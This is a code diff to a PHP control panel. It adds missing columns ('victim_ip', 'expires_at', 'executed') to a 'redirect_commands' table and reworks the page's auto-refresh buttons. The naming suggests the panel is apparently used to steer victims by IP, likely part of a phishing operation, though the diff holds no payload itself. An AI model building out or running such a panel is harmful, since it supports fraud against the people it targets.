@@ -16,23 +16,7 @@ $db = $database->getConnection();
 
 // Create/Update necessary tables
 try {
-    // Check if victim_ip column exists in redirect_commands table
-    $check_column = "SELECT column_name FROM information_schema.columns 
-                    WHERE table_name = 'redirect_commands' AND column_name = 'victim_ip'";
-    $column_stmt = $db->query($check_column);
-    $column_exists = $column_stmt->fetch(PDO::FETCH_ASSOC);
-    
-    if (!$column_exists) {
-        // Add victim_ip column if it doesn't exist
-        $alter_table = "ALTER TABLE redirect_commands ADD COLUMN victim_ip VARCHAR(45) NOT NULL DEFAULT '0.0.0.0'";
-        $db->exec($alter_table);
-        
-        // Update existing records if any
-        $update_existing = "UPDATE redirect_commands SET victim_ip = '0.0.0.0' WHERE victim_ip IS NULL";
-        $db->exec($update_existing);
-    }
-    
-    // Create redirect_commands table with expiration and IPv4 support (if not exists)
+    // First, create the table if it doesn't exist with all required columns
     $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
         id SERIAL PRIMARY KEY,
         command VARCHAR(50) NOT NULL,
@@ -43,6 +27,36 @@ try {
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )";
     $db->exec($create_table);
+    
+    // Check and add missing columns
+    $columns_to_check = ['victim_ip', 'expires_at', 'executed'];
+    
+    foreach ($columns_to_check as $column) {
+        $check_column = "SELECT column_name FROM information_schema.columns 
+                        WHERE table_name = 'redirect_commands' AND column_name = :column_name";
+        $stmt = $db->prepare($check_column);
+        $stmt->execute([':column_name' => $column]);
+        $column_exists = $stmt->fetch(PDO::FETCH_ASSOC);
+        
+        if (!$column_exists) {
+            switch($column) {
+                case 'victim_ip':
+                    $alter_sql = "ALTER TABLE redirect_commands ADD COLUMN victim_ip VARCHAR(45) NOT NULL DEFAULT '0.0.0.0'";
+                    break;
+                case 'expires_at':
+                    $alter_sql = "ALTER TABLE redirect_commands ADD COLUMN expires_at TIMESTAMP DEFAULT (NOW() + INTERVAL '30 seconds')";
+                    break;
+                case 'executed':
+                    $alter_sql = "ALTER TABLE redirect_commands ADD COLUMN executed BOOLEAN DEFAULT FALSE";
+                    break;
+            }
+            
+            if (isset($alter_sql)) {
+                $db->exec($alter_sql);
+                error_log("Added missing column: " . $column);
+            }
+        }
+    }
     
     // Create case_settings table
     $create_case_table = "CREATE TABLE IF NOT EXISTS case_settings (
@@ -314,6 +328,9 @@ if (isset($_SESSION['error_message'])) {
             bottom: 20px;
             right: 20px;
             z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
         .refresh-btn {
             background: var(--primary-color);
@@ -327,9 +344,22 @@ if (isset($_SESSION['error_message'])) {
             display: flex;
             align-items: center;
             justify-content: center;
+            font-size: 18px;
         }
         .refresh-btn:hover {
             background: #1976D2;
+        }
+        .refresh-btn.auto-refresh {
+            background: #4CAF50;
+        }
+        .refresh-btn.auto-refresh:hover {
+            background: #45a049;
+        }
+        .refresh-btn.paused {
+            background: #FF9800;
+        }
+        .refresh-btn.paused:hover {
+            background: #e68900;
         }
     </style>
 </head>
@@ -469,38 +499,46 @@ if (isset($_SESSION['error_message'])) {
             </form>
         </div>
 
-        <!-- Manual Refresh Button -->
+        <!-- Refresh Controls -->
         <div class="refresh-controls">
-            <button class="refresh-btn" onclick="window.location.reload()" title="Refresh Panel">
+            <button class="refresh-btn" onclick="window.location.reload()" title="Manual Refresh">
                 🔄
+            </button>
+            <button class="refresh-btn paused" id="autoRefreshBtn" onclick="toggleAutoRefresh()" title="Enable Auto Refresh (3s)">
+                ⏸️
             </button>
         </div>
 
-        <!-- Auto Refresh Script - Optional -->
         <script>
             let autoRefreshEnabled = false;
             let refreshInterval;
-            
+
             function toggleAutoRefresh() {
-                autoRefreshEnabled = !autoRefreshEnabled;
-                const btn = document.getElementById('refreshToggle');
+                const btn = document.getElementById('autoRefreshBtn');
                 
                 if (autoRefreshEnabled) {
+                    // Disable auto-refresh
+                    clearInterval(refreshInterval);
+                    btn.classList.remove('auto-refresh');
+                    btn.classList.add('paused');
+                    btn.innerHTML = '⏸️';
+                    btn.title = 'Enable Auto Refresh (3s)';
+                    autoRefreshEnabled = false;
+                } else {
+                    // Enable auto-refresh
                     refreshInterval = setInterval(function() {
                         window.location.reload();
                     }, 3000);
-                    btn.innerHTML = '⏸️';
-                    btn.title = 'Pause Auto Refresh';
-                    btn.style.background = '#FF9800';
-                } else {
-                    clearInterval(refreshInterval);
+                    btn.classList.remove('paused');
+                    btn.classList.add('auto-refresh');
                     btn.innerHTML = '🔄';
-                    btn.title = 'Enable Auto Refresh';
-                    btn.style.background = '#2196F3';
+                    btn.title = 'Auto Refresh Enabled (3s) - Click to Stop';
+                    autoRefreshEnabled = true;
                 }
             }
-            
-            // Uncomment below to enable auto-refresh by default
+
+            // Optional: Start with auto-refresh disabled
+            // To enable by default, uncomment the line below:
             // toggleAutoRefresh();
         </script>
     </main>
